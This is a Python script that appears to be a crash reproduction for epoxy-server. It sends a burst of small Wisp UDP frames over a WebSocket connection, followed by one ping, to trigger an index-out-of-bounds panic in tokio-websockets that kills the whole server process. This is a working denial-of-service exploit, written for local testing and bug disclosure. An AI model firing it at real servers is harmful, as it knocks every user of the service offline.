#!/usr/bin/env python3
"""40.08 epoxy-server crash repro: a burst of N small UDP DATA packets on one Wisp UDP stream makes the server
queue N small WS frames; tokio-websockets 0.12.0 FrameQueue::chunks_vectored writes past tokio's 64-entry IoSlice
array (2 slices per frame) -> panic "index out of bounds" -> the whole server process dies (all users).
Usage: epoxy_udp_burst.py WS_PORT N  (starts its own UDP echo target). Exit 0 = server survived."""
import socket, struct, sys, threading, time
port, n = int(sys.argv[1]), int(sys.argv[2])
u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.bind(("127.0.0.1", 0)); uport = u.getsockname()[1]
def echo():
    while True:
        d, a = u.recvfrom(65535); u.sendto(d, a)
threading.Thread(target=echo, daemon=True).start()
def frame(p):
    ln = len(p); h = bytes([0x82]) + (bytes([0x80 | ln]) if ln < 126 else bytes([0x80 | 126]) + struct.pack(">H", ln))
    return h + b"\0\0\0\0" + p
s = socket.create_connection(("127.0.0.1", port)); s.settimeout(5)
s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n")
buf = b""
while b"\r\n\r\n" not in buf: buf += s.recv(4096)
print("handshake:", buf.split(b"\r\n")[0].decode())
s.sendall(frame(b"\x01" + struct.pack("<I", 1) + b"\x02" + struct.pack("<H", uport) + b"127.0.0.1"))  # CONNECT UDP
time.sleep(0.3)
s.sendall(b"".join(frame(b"\x02" + struct.pack("<I", 1) + struct.pack("<I", i)) for i in range(n)))  # N x 4-byte datagrams
time.sleep(0.3)  # echoes come back and sit in epoxy's frame queue (epoxy does not flush UDP DATA by itself)
s.sendall(b"\x89\x80\0\0\0\0")  # one WS ping: the pong makes epoxy flush its whole queue
got, t0 = 0, time.time()
try:
    while time.time() - t0 < 3:
        d = s.recv(65536)
        if not d: print("server closed the connection"); break
        got += len(d)
except socket.timeout:
    pass
print(f"burst={n} bytes_back={got}")
